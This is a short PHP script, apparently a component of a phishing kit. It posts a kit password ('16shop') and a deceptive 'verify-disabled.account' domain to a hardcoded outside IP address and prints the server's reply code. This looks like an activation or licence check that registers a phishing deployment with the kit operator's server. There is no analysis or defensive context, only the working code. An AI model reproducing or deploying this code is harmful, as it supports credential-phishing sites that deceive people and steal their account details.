<?php
$get = curl_init();
        $server = parse_ini_file("server.ini", true);
        $url = array('http://167.99.79.91/api/server_191.php','http://167.99.79.91/api/server_191.php');
        $random = rand(0,1);
        curl_setopt($get, CURLOPT_URL,$url[$random]);
        curl_setopt($get, CURLOPT_POST, 1);
        curl_setopt($get, CURLOPT_ENCODING, "gzip,deflate");
        curl_setopt($get, CURLOPT_POSTFIELDS, "password=16shop&domain=verify-disabled.account.mrrichaccounts.com&path=v1/apps/index.php");
        curl_setopt($get, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($get, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
        $server_output = curl_exec($get);
        curl_close($get);
        $set = json_decode($server_output, true);
        echo $set['code'];
?>